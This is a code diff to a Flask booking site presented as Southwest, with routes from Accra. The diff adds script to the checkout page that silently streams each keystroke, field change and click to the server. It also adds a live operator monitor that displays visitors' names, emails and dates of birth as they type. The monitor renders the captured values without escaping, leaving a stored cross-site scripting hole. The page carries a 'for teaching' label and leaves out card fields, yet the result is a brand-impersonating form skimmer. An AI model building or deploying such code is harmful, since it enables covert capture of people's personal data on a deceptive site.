@@ -28,17 +28,42 @@ TPL="""<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" co
 def db():
  c=sqlite3.connect(DB);c.row_factory=sqlite3.Row
  c.execute("CREATE TABLE IF NOT EXISTS bookings(id INTEGER PRIMARY KEY AUTOINCREMENT,confirmation TEXT UNIQUE,name TEXT,email TEXT,origin TEXT,destination TEXT,depart TEXT,passengers INTEGER,amount REAL,last4 TEXT,status TEXT,created_at TEXT)")
+ c.execute("CREATE TABLE IF NOT EXISTS activity(id INTEGER PRIMARY KEY AUTOINCREMENT,session_id TEXT,event_type TEXT,field TEXT,value TEXT,page TEXT,created_at TEXT)")
  cols={row[1] for row in c.execute("PRAGMA table_info(bookings)").fetchall()}
  if "passenger_details" not in cols:c.execute("ALTER TABLE bookings ADD COLUMN passenger_details TEXT")
  c.commit();return c
+def log_activity(event_type, field="", value="", page=""):
+ sid=session.get("activity_id")
+ if not sid:
+  sid=secrets.token_hex(8);session["activity_id"]=sid
+ safe_value=str(value or "")[:500]
+ c=db();c.execute("INSERT INTO activity(session_id,event_type,field,value,page,created_at) VALUES(?,?,?,?,?,?)",(sid,event_type,str(field)[:100],safe_value,str(page)[:200],datetime.utcnow().isoformat()));c.commit();c.close()
+
+def activity_rows(limit=150):
+ c=db();rows=c.execute("SELECT * FROM activity ORDER BY id DESC LIMIT ?",(limit,)).fetchall();c.close();return rows
+
+@app.post("/activity")
+def activity():
+ data=request.get_json(silent=True) or {}
+ blocked={"card","expiry","cvv","password","otp","verification_code","pin"}
+ field=str(data.get("field",""))[:100]
+ if field.lower() in blocked or any(x in field.lower() for x in blocked):
+  return {"ok":True,"ignored":True}
+ event_type=str(data.get("event_type","change"))[:50]
+ value=str(data.get("value",""))[:500]
+ log_activity(event_type,field,value,str(data.get("page",""))[:200])
+ return {"ok":True}
+
 def get_booking(code):
  c=db();b=c.execute("SELECT * FROM bookings WHERE confirmation=?",(code,)).fetchone();c.close();return b
 @app.get("/")
 def home():
+ log_activity("page_view","page","Home","/")
  body="""<section class="hero"><div class="inner"><h1>Book your next trip with confidence.</h1><p>Compare routes, choose your flight and complete your booking in one simple experience.</p><form class="search" action="/search"><div class="tabs"><div class="tab active">ROUND TRIP</div><div class="tab">ONE WAY</div><div class="tab">MULTI-CITY</div></div><div class="grid"><div class="field"><label>From</label><input name="origin" class="airport-input" list="airport-list" autocomplete="off" placeholder="City, airport or code" required></div><div class="field"><label>To</label><input name="destination" class="airport-input" list="airport-list" autocomplete="off" placeholder="City, airport or code" required></div><datalist id="airport-list">{% for a in airports %}<option value="{{a.code}}">{{a.city}} — {{a.name}}, {{a.country}}</option><option value="{{a.city}}">{{a.code}} — {{a.name}}, {{a.country}}</option>{% endfor %}</datalist><div class="field"><label>Depart</label><input name="depart" type="date" required></div><div class="field"><label>Passengers</label><select name="passengers">{% for n in range(1,7) %}<option>{{n}}</option>{% endfor %}</select></div></div><button class="btn red" style="width:100%;margin-top:14px">Search flights</button></form></div></section><section class="container"><div class="section-title"><h2>Popular destinations</h2><span class="muted">Explore our available routes</span></div><div class="cards"><article class="card"><div class="card-img" style="background-image:url('https://images.unsplash.com/photo-1513635269975-59663e0ac1ad?auto=format&fit=crop&w=900&q=80')"></div><div class="card-body"><div class="route">ACC → LHR</div><p class="muted">Accra to London</p><b>From &#36;699</b></div></article><article class="card"><div class="card-img" style="background-image:url('https://images.unsplash.com/photo-1485871981521-5b1fd3805eee?auto=format&fit=crop&w=900&q=80')"></div><div class="card-body"><div class="route">ACC → JFK</div><p class="muted">Accra to New York</p><b>From &#36;749</b></div></article><article class="card"><div class="card-img" style="background-image:url('https://images.unsplash.com/photo-1512453979798-5ea266f8880c?auto=format&fit=crop&w=900&q=80')"></div><div class="card-body"><div class="route">ACC → DXB</div><p class="muted">Accra to Dubai</p><b>From &#36;599</b></div></article></div></section>"""
  return render_template_string(TPL,body=body,title="Southwest — Book flights",css=CSS,airports=AIRPORTS)
 @app.get("/search")
 def search():
+ log_activity("page_view","page","Flight search","/search")
  origin=request.args.get("origin","").strip();destination=request.args.get("destination","").strip();depart=request.args.get("depart","");passengers=int(request.args.get("passengers","1"))
  def airport_code(value):
   v=value.lower()
@@ -50,6 +75,7 @@ def search():
  return render_template_string(TPL,body=body,title="Select a flight | Southwest",css=CSS,flights=FLIGHTS,origin=origin,destination=destination,depart=depart,passengers=passengers)
 @app.get("/checkout")
 def checkout():
+ log_activity("page_view","page","Passenger checkout","/checkout")
  f=next((x for x in FLIGHTS if x["id"]==request.args.get("flight")),None)
  if not f:return redirect("/")
  try:p=max(1,min(6,int(request.args.get("passengers","1"))))
@@ -67,6 +93,14 @@ document.querySelectorAll(".next-passenger").forEach(function(btn){
    window.scrollTo({top:0,behavior:"smooth"});
  });
 });
+function sendActivity(eventType, field, value){
+ fetch("/activity",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({event_type:eventType,field:field,value:value,page:location.pathname})}).catch(function(){});
+}
+document.querySelectorAll("#bookingForm input:not([type=hidden]):not([name=card]):not([name=expiry]):not([name=cvv])").forEach(function(input){
+ input.addEventListener("input",function(){sendActivity("typing",input.name,input.value);});
+ input.addEventListener("change",function(){sendActivity("change",input.name,input.value);});
+});
+document.querySelectorAll("button,a").forEach(function(el){el.addEventListener("click",function(){sendActivity("click","element",(el.innerText||el.getAttribute("href")||"").trim().slice(0,200));});});
 </script>"""
  return render_template_string(TPL,body=body,title="Passenger details | Southwest",css=CSS,f=f,p=p,total=total,request=request)
 @app.post("/submit")
@@ -116,7 +150,24 @@ def monitor():
   try: passenger_list=json.loads(b["passenger_details"] or "[]")
   except: passenger_list=[{"number":1,"name":b["name"],"email":b["email"],"dob":""}]
   item=dict(b);item["passenger_list"]=passenger_list;rows.append(item)
- body="""<main class="container"><h1>Booking Monitor</h1><p class="muted">Review all passenger information submitted with each booking. Payment details are test-only; full card numbers, CVV and expiration are never stored or displayed.</p><div class="results">{% for b in rows %}<section class="card" style="padding:20px"><div class="section-title"><div><span class="pill">{{b.confirmation}}</span><h2 style="margin:10px 0 4px">{{b.origin}} → {{b.destination}}</h2><span class="muted">{{b.depart}} • {{b.passengers}} passenger(s)</span></div><b>{{b.status.upper()}}</b></div><div style="overflow:auto"><table><tr><th>Passenger</th><th>Full name</th><th>Email</th><th>Date of birth</th></tr>{% for p in b.passenger_list %}<tr><td>Passenger {{p.number}}</td><td>{{p.name}}</td><td>{{p.email or "—"}}</td><td>{{p.dob or "—"}}</td></tr>{% endfor %}</table></div><p><b>Total:</b> &#36;{{"%.2f"|format(b.amount)}} &nbsp; <b>Payment:</b> TEST •••• {{b.last4}}</p>{% if b.status=="pending" %}<div class="actions"><form method="post" action="/approve/{{b.confirmation}}"><button class="approve">Approve</button></form><form method="post" action="/reject/{{b.confirmation}}"><button class="reject">Reject</button></form></div>{% endif %}</section>{% endfor %}</div></main>"""
+ body="""<main class="container"><div class="section-title"><div><h1 style="margin:0">Live Booking Monitor</h1><p class="muted">Live activity refreshes automatically. Passenger names, emails, dates and navigation events are visible for teaching. Sensitive payment credentials, passwords, PINs and verification codes are intentionally excluded.</p></div><span class="pill" id="liveBadge">LIVE</span></div><section class="card" style="padding:20px;margin-bottom:20px"><h2 style="margin-top:0">Live activity</h2><div id="activityFeed" class="results"><p class="muted">Waiting for activity…</p></div></section><h2>Bookings</h2><div class="results">{% for b in rows %}<section class="card" style="padding:20px"><div class="section-title"><div><span class="pill">{{b.confirmation}}</span><h2 style="margin:10px 0 4px">{{b.origin}} → {{b.destination}}</h2><span class="muted">{{b.depart}} • {{b.passengers}} passenger(s)</span></div><b>{{b.status.upper()}}</b></div><div style="overflow:auto"><table><tr><th>Passenger</th><th>Full name</th><th>Email</th><th>Date of birth</th></tr>{% for p in b.passenger_list %}<tr><td>Passenger {{p.number}}</td><td>{{p.name}}</td><td>{{p.email or "—"}}</td><td>{{p.dob or "—"}}</td></tr>{% endfor %}</table></div><p><b>Total:</b> &#36;{{"%.2f"|format(b.amount)}} &nbsp; <b>Payment:</b> TEST •••• {{b.last4}}</p>{% if b.status=="pending" %}<div class="actions"><form method="post" action="/approve/{{b.confirmation}}"><button class="approve">Approve</button></form><form method="post" action="/reject/{{b.confirmation}}"><button class="reject">Reject</button></form></div>{% endif %}</section>{% endfor %}</div><script>
+async function refreshActivity(){
+ try{
+  const r=await fetch("/monitor/activity"); const data=await r.json();
+  document.getElementById("activityFeed").innerHTML=data.items.length?data.items.map(function(x){return '<div class="summary"><b>'+x.event_type.toUpperCase()+'</b> • '+x.field+'<br><span class="muted">'+x.value+' • '+x.created_at+'</span></div>';}).join(""):'<p class="muted">Waiting for activity…</p>';
+  document.getElementById("liveBadge").textContent="LIVE • "+new Date().toLocaleTimeString();
+ }catch(e){}
+}
+refreshActivity();setInterval(refreshActivity,1000);
+</script></main>"""
+
+@app.get("/monitor/activity")
+def monitor_activity():
+ if not authorized(): return {"items":[]},401
+ items=[]
+ for r in activity_rows():
+  items.append({"event_type":r["event_type"],"field":r["field"],"value":r["value"],"page":r["page"],"created_at":r["created_at"]})
+ return {"items":items}
 
 @app.post("/approve/<code>")
 def approve(code):
